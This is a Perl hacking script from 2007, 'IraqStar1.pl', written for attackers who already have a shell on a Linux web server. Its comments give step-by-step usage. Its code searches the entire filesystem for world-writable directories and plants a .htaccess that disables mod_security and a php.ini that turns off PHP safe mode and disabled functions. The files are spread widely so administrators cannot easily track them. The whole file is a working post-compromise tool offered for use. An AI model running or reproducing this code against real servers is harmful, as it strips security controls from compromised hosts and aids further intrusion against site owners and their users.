#!/usr/bin/perl -w
 
#################################################################################
 
#################################################################################
 
###########################                         #############################
########################### The IraqStar1.pl Script #############################
###########################                         #############################
#################################################################################
###########################          By:            #############################
###########################   The Lion of London    #############################
###########################     www.7shasha.com     ############################# 
###############################                ##################################
############################### 31 August 2007 ##################################
#############                                                      ##############
#############                 Special Greetz to                    ##############
#############      SoSo H H + MIZO + IRaQi_StRikE + El Mariachi    ##############
#############                                                      ##############
#################################################################################
########################   B E T A      V E R S I O N   #########################
#################################################################################
#
# Introduction:
#==============
# This Perl script does the following:
# 1- Searches the Linux/Unix File System for all directories with 777 permission
# 2- Automatically generates two files:
# 2-1 .htaccess file to Kill Mod_security
# 2-2 php.ini file to Kill Safe Mode && to make Disable Functions = None.
# 3- Saves these two files in all paths found from the search process.
# 
# How IraqStar1.pl Works:
#=======================
# Assuming you have a Shell on a Website, this Website is hosted on a Web Server. 
# (Note: This script works of Linux/Unit servers only!). We will try to inject 
# the server with .htaccess & php.ini files that are going to Stop the Security 
# on that Web Server. These two files will be distributed in the server in many 
# directories so that the System Admin and/or the Web Master will not be easy for
# them to follow all the pathes where these files will be created. Yes, it looks
# like a dynamic worm more than just a static Perl script as the ones you've been 
# given in hackers forums.
# 
# Working Steps:
#===============
# 1- Make sure the server has Perl package installed, by typing: perl -v
#    if Perl was already installed on the server, then you will see a 
#    message telling u that Perl is installed and the version of Perl.
# 
# ====> if this is the case, then move to next steps, BUT if Perl was NOT 
#       installed, then this script will not work. GOTO: EXIT lool
# 
# 2- Upload the IraqStar1.pl to the Server through the Shell.
#
# 3- Make the IraqStar1.pl script gets 777 permission, by typing: 
#    chmod 777 IraqStar.pl
#
# 4- Now the final step: run the script by typing: 
#
##############################################
##########                        ############
##########    perl IraqStar1.pl   ############
##########                        ############
##############################################
#
# Thats it. If you get the expected results, then all the security on the Server
# will be destroyed. 
# 
# Well then. Enjoy it :)
#
#################################################################################
#################################################################################
 
use File::Find; # I will use this Perl Module, cuz its the one we need to do the search with.
find (\&wanted, '/'); # Search the File System starting from the Root directory "/".
# Please replace the "USER" with the current user whose ur Sh3ll on his/her path:
# find (\&wanted, '/home/USER/public_html');  
##############################################################################
############################# The Search Subroutine ##########################
############################################################################## 
sub wanted
{
if ( -d $File::Find::name )
{
      $mode = (stat($File::Find::name))[2];
#                 print "This is mode as Dec : $mode\n";
  $mode = sprintf "%04o", $mode & 07777;
#                 print "AND first then convert to Oct: $mode\n";
          if ($mode == 777)
          {
             print "$File::Find::name \> Fianl mode was $mode\n" ;
             &killSec($File::Find::name);
          }
} 
}
##############################################################################
############################# killSec Subroutine #############################
############################################################################## 
sub killSec
{
my $TMP = @_[0];  # I used the "my" to speed up the search ;)
#        print "The TMP now is : $TMP\n"; # This is optional for u to test it.
############################## Create .htaccess file ######################### 
my $PATH1 = $TMP."/.htaccess";
#        print "The PATH for .htaccess now is : $PATH1\n"; # Optional as well.
open MYPATH1, ">$PATH1";
print MYPATH1
"
<IfModule mod_security\.c>\n
SecFilterEngine Off\n
SecFilterScanPOST Off\n
</IfModule>\n
";
close MYPATH1;
############################## Create php.ini file #########################  
my $PATH2 = $TMP."/php.ini"; 
#        print "The PATH for php.ini is : $PATH2\n";
open MYPATH2, ">$PATH2";
print MYPATH2
"
Safe_mode = off\n
Disable_functions = None\n
";
close MYPATH2;
 
}
##############################################################################